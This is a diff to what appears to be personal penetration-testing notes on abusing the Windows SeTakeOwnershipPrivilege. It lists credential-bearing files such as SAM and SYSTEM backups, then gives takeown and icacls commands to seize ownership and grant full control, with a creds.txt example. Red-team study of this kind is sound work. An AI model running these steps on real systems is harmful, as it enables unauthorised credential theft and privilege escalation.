@@ -46,18 +46,104 @@ whoami /priv
 
 #### *Abuse - Windows*
 
-Let's suppose that 
+Let's suppose that we compromise a domain user account that can *RDP* to a a *domain-joined* machine as it belongs to the *Remote Desktop Users* group of the latter
+
+Once we establish a remote connection to the target through *RDP*, we start by listing which privileges the given user account has
+
+To do so, we can issue the following command
+
+```bash
+whoami /priv
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> PRIVILEGES INFORMATION
+> ----------------------
+> 
+> Privilege Name                Description                              State
+> ============================= ======================================== ========
+> SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+> SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+> SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+> ```
+>
+
+We see that the user has the *SeTakeOwnershipPrivilege*. So, we can leverage this privilege by abusing the *WRITE_OWNER* right to modify the owner of any *secure object* we want and take *FULL CONTROL* over it
+
+However, there is a problem as the privilege in question is disable, so first we must enable it in order to accomplish our goal
+
+To do so, we can proceed as follows →
 
 ##### *Enabling SeTakeOwnershipPrivilege*
 
 > ***See [[WINDOWS PRIVESC#Enabling disabled Privileges|Enabling disabled Privileges]]***
 
-##### *Trying to list the Owner of an specific Resource*
+##### *Trying to list the Owner of an specific resource*
 
 > ***A file, directory or named pipe***
 
+Once we enable the given privilege, it's time to look for a sensitive resource to compromise
+
+We typically want to search for shares, directories or files containing sensitive information such as creds and other types of juicy stuff
+
+##### *Resources of Interest*
+
+> [!BUG]- *Resources*
+>
+> ```bash
+> %WINDIR%\repair\SAM
+> %WINDIR%\repair\SYSTEM
+> %WINDIR%\repair\SECURITY
+> %WINDIR%\repair\software
+> %WINDIR%\system32\config\SecEvent.Evt
+> %WINDIR%\system32\config\default.sav
+> %WINDIR%\system32\config\security.sav
+> %WINDIR%\system32\config\software.sav
+> %WINDIR%\system32\config\system.sav
+> ```
+>
+
+Once we find out an interesting target, first we have to list its owner
+
+> ***PS***
+
 ```bash
-dir -Path '<RESOURCE_PATH>' | Select Fullname, LastWriteTime, Attributes, @{Name=Owner; Expression={ (Get-ACL $_.FullName ).Owner }}
+dir -Path '<RESOURCE_PATH>' | Select Fullname, LastWriteTime, Attributes, @{Name='Owner'; Expression={ (Get-ACL $_.FullName ).Owner }}
 ```
 
-##### **
+> ***CMD***
+
+```bash
+dir /q '<RESOURCE_PATH>'
+```
+
+##### *Taking Ownership of the resource*
+
+```bash
+takeown /f '<RESOURCE_PATH>'
+```
+
+##### *Verifying the Ownership*
+
+Once again, we can run one of the ***[[#Trying to list the Owner of an specific resource|following commands]]*** to list the owner of the given resource
+
+##### *Adding a new ACE to the Object's DACL*
+
+As stated previously, once we own an object, we implicity gain the *WRITE_DACL* right over the latter, thereby being capable of create, modify and delete any existing *ACE* within the *DACL* of the *object's security descriptor*
+
+In this case we want *FULL CONTROL* over the object, so we can create a *DACL* which gives this right to the controlled user over the targeted resource
+
+To do, proceed as follows
+
+```bash
+icacls /grant <PRINCIPAL>:F '<RESOURCE_PATH>'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> icacls /grant domain.internal\john.doe:F 'C:\creds.txt'
+> ```
+>
